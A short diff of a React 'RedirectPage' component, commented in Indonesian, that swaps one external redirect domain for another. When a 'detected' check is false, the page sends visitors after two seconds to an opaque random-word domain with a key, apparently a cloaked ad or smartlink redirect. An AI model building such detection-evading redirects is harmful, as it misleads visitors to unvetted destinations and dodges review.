@@ -14,7 +14,7 @@ export default function RedirectPage() {
     if (!detected) {
       // Redirect user after delay
       setTimeout(() => {
-        window.location.href = "https://correspondencebirthday.com/q3sc09250?key=d2f645145443ac96251458e6cadaac1b"; // Ganti dengan URL tujuan
+        window.location.href = "https://difficultywithhold.com/q3sc09250?key=d2f645145443ac96251458e6cadaac1b"; // Ganti dengan URL tujuan
       }, 2000); // Delay 2 detik
     }
   }, []);
